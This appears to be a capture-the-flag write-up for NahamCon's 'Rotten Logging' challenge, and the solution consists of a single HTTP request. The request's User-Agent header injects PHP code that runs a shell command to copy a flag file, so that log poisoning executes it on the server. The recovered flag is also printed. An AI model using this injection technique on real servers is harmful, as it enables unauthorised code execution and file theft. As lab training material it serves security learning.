# Rotten Logging

Tags: _log poisoning_

## Challenge

>Author: @NightWolf#0268
>
>This is Stage 3 of Path 3 in The Mission. After solving this challenge, you may need to refresh the page to see the newly unlocked challenges.
>
>Orion was interested in purchasing this service to handle all the logs that CONSTELLATIONS generates. Something seems off though...
>
>Click the Start button to begin this challenge.
>
>Connect with:
>
>http://challenge.nahamcon.com:30495
>
>http://challenge.nahamcon.com:31974
>



## Solving

```
GET / HTTP/1.1

Host: challenge.nahamcon.com:30495

User-Agent: <?php exec('cat /var/www/localhost/htdocs/ThSe7x68A7Mo67-breachdetails/flag.txt > /tmp/gv'); ?>

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Cookie: authtoken=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd2In0.7kCsg0zqouwUCy-8EGQPkQQqlsBii5_qiDbj3at-ZME

Upgrade-Insecure-Requests: 1
```


`flag{892427c840bdb0f4cf16af94b7312804}`
